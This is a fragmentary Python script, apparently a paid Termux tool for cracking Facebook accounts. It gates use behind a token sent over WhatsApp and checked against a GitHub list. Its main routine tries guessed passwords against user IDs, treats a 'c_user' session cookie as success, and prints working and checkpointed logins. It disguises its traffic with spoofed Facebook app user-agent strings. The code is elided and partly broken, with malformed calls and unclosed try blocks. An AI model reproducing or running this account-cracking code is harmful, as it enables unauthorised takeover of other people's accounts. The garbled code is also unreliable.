...
def main_apv():
    ...
    try:
        ...
        tks = ('HEMLO%20Asif%20BRO%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+ak+key1);os.system('am start https://wa.me/++994400385410?text='+tks)
        main_apv()
    r1=requests.get("https://github.com/asifl360/just-ck/blob/main/Justck.txt").text
    if key1 in r1:
        Asif()
    else:
        os.system("clear")
        ...
        print ("")
        input(' \t\033[1;92m    Press Enter To Buy this Tool')
        tks = ('HEMLO%20Asif%20BRO%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+ak+key1);os.system('am start https://wa.me/+994400385410?text='+tks);main_apv()
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			input('\n [*] Press Enter To Back');Asif()
     
		self.__pler__()
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;92m [THE Asif] %s/%s  \033[1;92mOK-:%s | \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[Asif-CP] %s | %s â¢ %s %s %s%s      ' % (user,pw,day,month,year,tahn(user)))
					...
					pass
				print('\r\033[1;92m[Asif-OK] %s | %s%s      ' % (user,pw,tahun(user)))
...
Asif_ua_xaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
Asif_ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
Asif_ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
Asif_ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
Asif_ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
Asif_ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
Asif_ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
Asif_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
banner = """      
...
==================================================
           CODED BY : THE King   
           WHATSAPP : 01732908482    
           FB PAGE  : Asif TRICKER   
==================================================           
